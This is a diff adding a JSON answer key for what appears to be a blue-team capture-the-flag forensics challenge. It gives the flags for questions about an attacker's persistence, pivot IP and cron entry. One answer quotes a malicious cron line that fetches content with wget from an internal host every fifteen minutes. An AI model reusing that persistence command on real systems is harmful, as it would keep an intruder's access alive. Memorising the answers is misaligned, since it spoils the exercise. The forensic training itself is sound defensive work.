@@ -1,0 +1,5 @@
+{
+  "BT-04a: What persistence mechanism was installed?": "DZ{crontab}",
+  "BT-04b: What is the full cron entry added by the attacker?": "DZ{*/15 * * * * woc-observer wget -q -O- http://10.10.5.219/update}",
+  "BT-04c: What internal IP did the attacker pivot to?": "DZ{10.10.2.87}"
+}
